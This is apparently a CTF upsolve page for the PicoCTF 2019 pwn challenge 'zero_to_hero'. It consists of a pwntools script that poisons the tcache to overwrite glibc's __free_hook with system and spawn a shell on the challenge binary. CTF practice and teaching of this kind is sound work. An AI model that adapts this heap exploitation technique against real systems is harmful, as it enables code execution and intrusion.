---
title: "PicoCTF 2019 Upsolve: zero_to_hero"
description: "One of the many tcache poisoning pico challs"
slug: "picoctf-z2h"
date: "2026-02-22 00:00:00+0000"
image: "cover.png"
categories:
    - "Pwn"
tags: 
weight: 1
---

```py
#!/usr/bin/env python3
from pwn import *
import os
import re


elf = ELF("./zero_to_hero", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.29.so", checksec=False)

HOST = "fickle-tempest.picoctf.net"
PORT = 63309

local = True

env = os.environ.copy()
env["LD_PRELOAD"] = libc.path
io = process([ld.path, "--library-path", ".", elf.path], env=env)

if not local:
    io = remote(HOST, PORT)


def menu(io, choice: int):
    io.sendlineafter(b"> ", str(choice).encode())


def add(io, size: int, data: bytes):
    menu(io, 1)
    io.sendlineafter(b"> ", str(size).encode())

    if len(data) > size:
        data = data[:size]
    if len(data) < size:
        data = data.ljust(size, b"A")

    io.sendafter(b"Enter your description: ", data)


def remove(io, idx: int):
    menu(io, 2)
    io.sendlineafter(b"> ", str(idx).encode())


def solve():
    io.sendlineafter(b"So, you want to be a hero?", b"y")
    io.recvuntil(b"It's dangerous to go alone. Take this: ")
    system_leak = int(io.recvline().strip(), 16)

    libc.address = system_leak - libc.sym.system
    free_hook = libc.sym.__free_hook
    log.info(f"system leak: {hex(system_leak)}")
    log.info(f"libc base : {hex(libc.address)}")
    log.info(f"__free_hook: {hex(free_hook)}")

    add(io, 0x108, b"B" * 0x108)
    add(io, 0x108, b"C" * 0x108)
    remove(io, 1)
    remove(io, 0)

    add(io, 0x108, b"D" * 0x108)

    remove(io, 1)

    add(io, 0xF8, p64(free_hook - 8))

    add(io, 0x108, b"E" * 0x108)
    add(io, 0x108, b"P" * 8 + p64(libc.sym.system))

    add(io, 0x20, b"/bin/sh\x00")
    remove(io, 6)

    io.interactive()


if __name__ == "__main__":
    solve()
```